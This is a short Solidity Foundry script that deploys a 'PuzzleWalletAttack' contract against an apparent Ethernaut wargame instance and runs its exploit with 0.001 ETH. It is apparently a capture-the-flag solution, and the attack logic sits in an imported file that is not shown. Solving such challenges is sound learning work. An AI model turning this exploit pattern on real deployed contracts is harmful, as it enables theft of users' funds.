// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/PuzzleWalletAttack.sol";

contract PuzzleWalletScript is Script {
    function run() external {
        vm.startBroadcast();

        // 1. Deploy the attack contract pointing at the Ethernaut instance
        address target = 0x3D9BAbAABEBceCF0D3603CA02926d5CECCD3CDE7;
        PuzzleWalletAttack attack = new PuzzleWalletAttack(target);

        // 2. Execute the exploit, sending 0.001 ETH for the deposit trick
        attack.exploit{value: 0.001 ether}();

        vm.stopBroadcast();
    }
}
